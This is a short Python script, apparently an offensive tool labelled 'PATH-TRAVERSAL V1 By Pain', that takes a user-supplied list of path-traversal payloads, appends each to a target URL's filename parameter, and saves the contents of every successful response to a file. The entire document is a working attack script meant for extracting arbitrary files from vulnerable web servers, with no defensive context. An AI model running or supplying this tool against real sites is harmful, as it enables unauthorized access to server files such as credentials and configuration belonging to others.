import requests
from colorama import Fore

print(Fore.RED+'''
██████   █████  ████████ ██   ██       ████████ ██████   █████  ██    ██ ███████ ██████  ███████  █████  ██      
██   ██ ██   ██    ██    ██   ██          ██    ██   ██ ██   ██ ██    ██ ██      ██   ██ ██      ██   ██ ██      
██████  ███████    ██    ███████ █████    ██    ██████  ███████ ██    ██ █████   ██████  ███████ ███████ ██      
██      ██   ██    ██    ██   ██          ██    ██   ██ ██   ██  ██  ██  ██      ██   ██      ██ ██   ██ ██      
██      ██   ██    ██    ██   ██          ██    ██   ██ ██   ██   ████   ███████ ██   ██ ███████ ██   ██ ███████ 

V1    By Pain
'''+Fore.RESET)

req  = requests.session()

file = input('Enter File Name For Found -> ')

try:
    c = input('Enter File Path -> ')

    with open(c,'r') as combo:
        combos = combo.readlines()
except:
    print(Fore.RED+f'File {c} Not Found'+Fore.RESET)
target = input('Enter Target (https://example.com/var/www/image?filename=[Payload]) -> ')

for line in combos:
    comboo = line.rstrip()
    try:
        source = req.get(target+comboo)
        length = len(source.content)
        if source.status_code == 200:
            print(Fore.GREEN+f'[Get] -> {source} : Byts -> [{length}]'+Fore.RESET)
            with open(file,'a') as maa:
                maa.write(source.text+'\n \n =================================================================\n')
        elif source.status_code == 300:
            print(Fore.YELLOW+f'[Get] -> {source} : Byts -> [{length}]'+Fore.RESET)
        elif source.status_code == 400:
            print(Fore.RED+f'[Get] -> {source} : Byts -> [{length}]'+Fore.RESET)
    except:
        print()
